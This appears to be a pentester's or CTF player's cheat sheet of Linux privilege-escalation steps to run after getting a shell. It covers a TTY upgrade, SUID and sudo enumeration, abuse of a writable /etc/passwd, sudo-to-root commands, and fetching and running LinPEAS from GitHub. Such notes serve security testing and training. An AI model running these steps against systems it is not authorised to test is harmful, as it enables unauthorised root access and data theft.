2>/dev/nullOnce you got shell access, run the following commands to see what's going on on the box.

# Terminal Setup

### Setup
The run the following to get a nice shell:
```
python -c 'import pty;pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usrgames:/tmp
export TERM=xterm-256color
```
### Exit Session
To put the session in the background, run:
```
Control-Z
```
### Re-enagde Session:
```
stty raw -echo ; fg ; reset
```

# Kernel & arch
```
id
whoami
env
uname -a
find /bin/bash
cat /etc/issues
cat /etc*-release
```

# Sudo, SUID's, GUIDs
```
sudo -l
# OR
sudo -ll
ls -lsaht /etc/sudoers
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```
Check for any commands you can run using sudo
# Look Here:
```
/home
/opt
/tmp
/var

```

### Writeable /etc/passwd
```
ls -lah /etc/passwd
openssl passwd password
```

# Check files you can run
```
find / -perm -4000 -type f 2>/dev/null
```
Check for a possible shell that you cat run which might give you privilege escalation (e.g.: zsh)

# www-data User
Check if www-data can run sudo as root without password:
```
sudo -l
# Then run:
sudo -u root sudo bash -p

# OR
sudo -u root /usr/bin/sudo su root
```

# Check if port knocking is enabled
Port knocking is where to SSH port is closed untill such a time you knock on the port with spesific sequence to open it:
```
cat /etc/knockd.conf
```

For more details, check out "Tool usage > SSH > SSH Port Filtered (Port Knocking)"

# LinPEAS
Try running LinPEAS

Step 1: Download
```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

Step 2: Set Permissions
```
chmod +x linpeas.sh
```

Step 3: Execute:
```
./linpeas.sh
```

Transfer via HTTP:
```
python3 -m http.server 8000
```

Save Output:
```
./linpeas.sh > output.txt
```

See what else runs on the box:
```
netstat -tulpn
```

# Check e-mails
See if there are any mails for a user and if you can access it
Example:
```
cd /var/mail

```